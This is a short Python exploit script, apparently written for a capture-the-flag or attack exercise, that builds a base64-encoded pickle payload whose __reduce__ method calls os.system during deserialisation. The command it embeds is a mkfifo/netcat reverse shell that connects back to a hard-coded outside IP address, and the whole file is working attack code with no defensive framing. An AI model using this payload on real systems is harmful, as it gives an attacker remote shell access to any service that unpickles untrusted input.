import pickle
import os
import base64
from pwn import *

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return os.system, (self.cmd,)

def exploit():
    while True:
        cmd = input("$ ")
        print(cmd)
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 20.70.203.63 80 > /tmp/f')
        pickled = pickle.dumps(RCE(cmd))
        payload = base64.b64encode(pickled).decode()
        print(payload)

if __name__ == "__main__":
    exploit()
